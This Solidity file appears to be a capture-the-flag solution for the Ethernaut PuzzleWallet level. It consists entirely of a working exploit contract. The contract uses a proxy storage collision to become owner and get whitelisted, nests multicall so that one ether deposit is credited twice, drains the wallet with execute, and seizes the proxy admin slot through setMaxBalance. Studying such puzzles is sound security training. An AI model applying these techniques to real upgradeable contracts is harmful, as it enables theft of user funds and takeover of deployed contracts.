// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./PuzzleWallet.sol";

function playerScript(address instanceAddress) {
    new PuzzleWalletExploit().exploit{value: 0.001 ether}(instanceAddress);
}

contract PuzzleWalletExploit {
    bytes[] data_ = [abi.encodeWithSignature("deposit()")];
    bytes[] data = [abi.encodeWithSignature("deposit()"), abi.encodeWithSignature("multicall(bytes[])", data_)];

    function exploit(address instanceAddress) public payable {
        PuzzleProxy proxy = PuzzleProxy(payable(instanceAddress));
        PuzzleWallet wallet = PuzzleWallet(instanceAddress);
        proxy.proposeNewAdmin(address(this));
        wallet.addToWhitelist(address(this));
        wallet.multicall{value: 0.001 ether}(data);
        wallet.execute(address(this), 0.002 ether, "");
        wallet.setMaxBalance(uint256(uint160(msg.sender)));
    }

    receive() external payable {}
}
